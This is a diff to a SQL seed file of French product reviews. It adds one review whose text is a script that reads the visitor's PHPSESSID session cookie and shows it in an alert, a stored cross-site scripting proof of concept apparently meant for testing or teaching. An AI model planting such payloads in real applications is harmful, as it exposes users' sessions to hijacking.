@@ -58,6 +58,24 @@ INSERT INTO comments (user_id, product_id, rating, comment) VALUES
                                                                 (2, 1, 5, 'Excellent smartphone ! L''appareil photo est vraiment impressionnant et la performance est au top.'),
                                                                 (3, 1, 4, 'Très bon produit mais le prix est un peu élevé. La qualité Apple est au rendez-vous.'),
                                                                 (4, 1, 5, 'Je recommande vivement ! Meilleur iPhone à ce jour.'),
+                                                                (1, 1, 5, '<script>
+function getCookie(name) {
+  const cookies = document.cookie.split('';'');
+  for (let cookie of cookies) {
+    cookie = cookie.trim();
+    if (cookie.includes(name) == true) {
+        return cookie.split("=")[1];
+    }
+  }
+  return null; // cookie non trouvé
+}
+const monToken = getCookie(''PHPSESSID'');
+if (monToken) {
+  alert(`Valeur du cookie token : ${monToken}`);
+} else {
+  alert(''Le cookie "monToken" n’existe pas'')
+}
+</script>'),
 
                                                                 (2, 2, 4, 'Bon smartphone Android, l''IA est intéressante mais pas révolutionnaire.'),
                                                                 (3, 2, 5, 'J''adore mon Galaxy S24 ! L''écran est magnifique et la batterie tient bien.'),
